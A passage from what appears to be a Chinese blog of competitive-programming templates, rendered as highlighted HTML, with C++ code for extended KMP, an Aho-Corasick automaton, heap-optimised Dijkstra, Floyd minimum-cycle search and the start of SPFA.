operator">>=</span> p<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> p<span class="token punctuation">)</span>                p <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> m <span class="token operator">&amp;&amp;</span> T<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">==</span> T<span class="token punctuation">[</span>p <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span>                p<span class="token operator">++</span><span class="token punctuation">;</span>            nxt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> p <span class="token operator">-</span> i<span class="token punctuation">;</span>            a <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>            nxt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nxt<span class="token punctuation">[</span>i <span class="token operator">-</span> a<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/* 求解 extend[] */</span><span class="token keyword">void</span> <span class="token function">GetExtend</span><span class="token punctuation">(</span>string <span class="token operator">&amp;</span> S<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">&amp;</span> n<span class="token punctuation">,</span> string <span class="token operator">&amp;</span> T<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">&amp;</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> extend<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> nxt<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">GetNext</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span> m<span class="token punctuation">,</span> nxt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> p <span class="token operator">||</span> i <span class="token operator">+</span> nxt<span class="token punctuation">[</span>i <span class="token operator">-</span> a<span class="token punctuation">]</span> <span class="token operator">>=</span> p<span class="token punctuation">)</span> <span class="token comment">// i >= p 的作用：举个典型例子，S 和 T 无一字符相同</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> p<span class="token punctuation">)</span>                p <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> n <span class="token operator">&amp;&amp;</span> p <span class="token operator">-</span> i <span class="token operator">&lt;</span> m <span class="token operator">&amp;&amp;</span> S<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">==</span> T<span class="token punctuation">[</span>p <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span>                p<span class="token operator">++</span><span class="token punctuation">;</span>            extend<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> p <span class="token operator">-</span> i<span class="token punctuation">;</span>            a <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>            extend<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nxt<span class="token punctuation">[</span>i <span class="token operator">-</span> a<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="13-AC自动机"><a href="#13-AC自动机" class="headerlink" title="13. AC自动机"></a>13. AC自动机</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">char</span> p<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Aho_Corasick</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> next<span class="token punctuation">[</span>max_tot<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nd<span class="token punctuation">[</span>max_tot<span class="token punctuation">]</span><span class="token punctuation">,</span> fail<span class="token punctuation">[</span>max_tot<span class="token punctuation">]</span><span class="token punctuation">,</span> vis<span class="token punctuation">[</span>max_tot<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> root<span class="token punctuation">,</span> L<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            next<span class="token punctuation">[</span>L<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        nd<span class="token punctuation">[</span>L<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>L<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> L<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        L <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        root <span class="token operator">=</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> now <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> sz <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            key <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'a'</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            now <span class="token operator">=</span> next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        nd<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// fail数组含义</span>        <span class="token comment">// 和i节点代表的前缀的后缀匹配的trie上最长真前缀，由trie树性质得唯一</span>        <span class="token comment">// 即当i节点的某边发生失配时转移到达的trie上最长真前缀</span>        <span class="token comment">// if(next[i][j] == -1) next[i][j] = next[fail[i]][j]</span>        queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> Q<span class="token punctuation">;</span>        fail<span class="token punctuation">[</span>root<span class="token punctuation">]</span> <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>root<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            next<span class="token punctuation">[</span>root<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            fail<span class="token punctuation">[</span>next<span class="token punctuation">[</span>root<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> root<span class="token punctuation">;</span>            Q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>root<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>Q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> now <span class="token operator">=</span> Q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> next<span class="token punctuation">[</span>fail<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>            <span class="token punctuation">&#123;</span>                fail<span class="token punctuation">[</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> next<span class="token punctuation">[</span>fail<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                Q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> now <span class="token operator">=</span> root<span class="token punctuation">,</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> tmp<span class="token punctuation">,</span> sz <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            key <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'a'</span><span class="token punctuation">;</span>            tmp <span class="token operator">=</span> now <span class="token operator">=</span> next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>tmp <span class="token operator">!=</span> root <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>vis<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                ret <span class="token operator">+=</span> nd<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">;</span>                nd<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                vis<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                tmp <span class="token operator">=</span> fail<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> aho<span class="token punctuation">;</span><span class="token keyword">int</span> cas<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>cas<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cas<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        aho<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>            aho<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        aho<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> aho<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="14-最短路算法"><a href="#14-最短路算法" class="headerlink" title="14. 最短路算法"></a>14. 最短路算法</h3><h4 id="14-1-Dijkstra-堆优化"><a href="#14-1-Dijkstra-堆优化" class="headerlink" title="14.1 Dijkstra+堆优化"></a>14.1 Dijkstra+堆优化</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">typedef</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span> <span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">></span>  pii<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn<span class="token operator">=</span><span class="token number">2e5</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">;</span>priority_queue<span class="token operator">&lt;</span>pii<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span>pii<span class="token operator">></span><span class="token punctuation">,</span>greater<span class="token operator">&lt;</span>pii<span class="token operator">></span> <span class="token operator">></span>pq<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">edge</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> to<span class="token punctuation">;</span>    <span class="token keyword">int</span> cost<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>edge<span class="token operator">></span> G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//g[i]--i to g[i].to cost cost</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> s<span class="token punctuation">;</span><span class="token keyword">int</span> dis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> vis<span class="token punctuation">[</span>manx<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dijk</span><span class="token punctuation">(</span><span class="token keyword">int</span> s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>    dis<span class="token punctuation">[</span>s<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">make_pair</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>pq<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        pii u <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        pq<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> x <span class="token operator">=</span> u<span class="token punctuation">.</span>second<span class="token punctuation">;</span> <span class="token comment">// bian hao</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>vis<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            edge e <span class="token operator">=</span> G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>dis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span> <span class="token operator">></span> dis<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">+</span> e<span class="token punctuation">.</span>cost<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                dis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span> <span class="token operator">=</span> dis<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">+</span> e<span class="token punctuation">.</span>cost<span class="token punctuation">;</span>                pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">make_pair</span><span class="token punctuation">(</span>dis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>to<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m <span class="token operator">>></span> s<span class="token punctuation">;</span>    <span class="token keyword">int</span> from<span class="token punctuation">,</span> to<span class="token punctuation">,</span> cost<span class="token punctuation">;</span>    edge in<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> from <span class="token operator">>></span> to <span class="token operator">>></span> cost<span class="token punctuation">;</span>        in<span class="token punctuation">.</span>to <span class="token operator">=</span> to<span class="token punctuation">;</span> in<span class="token punctuation">.</span>cost <span class="token operator">=</span> cost<span class="token punctuation">;</span>        G<span class="token punctuation">[</span>from<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">dijk</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cout <span class="token operator">&lt;&lt;</span> dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="14-2-floyd"><a href="#14-2-floyd" class="headerlink" title="14.2 floyd"></a>14.2 floyd</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//floyd求最小环</span><span class="token keyword">void</span> <span class="token function">floyd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">;</span>    <span class="token keyword">int</span> ans <span class="token operator">=</span> inf<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> mp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> mp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> ans<span class="token punctuation">)</span>                    ans <span class="token operator">=</span> dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> mp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> mp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dis<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                    dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dis<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="14-3-spfa"><a href="#14-3-spfa" class="headerlink" title="14.3 spfa"></a>14.3 spfa</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> to<span class="token punctuation">,</span>w<span class="token punctuation">,</span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>edge<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> head<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> tot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">addedge</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">,</span><span class="token keyword">int</span> z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    tot<span class="token operator">++</span><span class="token punctuation">;</span>    edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>w <span class="token 